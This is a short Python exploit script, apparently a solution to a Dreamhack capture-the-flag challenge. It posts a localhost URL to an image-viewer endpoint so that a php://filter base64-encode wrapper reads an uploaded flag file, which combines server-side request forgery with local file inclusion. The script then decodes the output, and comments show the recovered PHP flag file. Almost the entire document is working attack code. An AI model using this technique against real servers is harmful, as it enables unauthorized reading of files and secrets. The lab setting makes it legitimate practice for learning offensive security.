import requests
import re
from base64 import b64decode

r = requests.post('http://host3.dreamhack.games:23814/img_viewer', {
    'url': f'http://localhost/index.php?page=php://filter/convert.base64-encode/resource=../uploads/flag'
})

print(b64decode(re.search('base64, (.*)"', r.text)[1]).decode())


# <?php
# 	$flag = 'This is php-1 flag';
# ?>
# can you see $flag?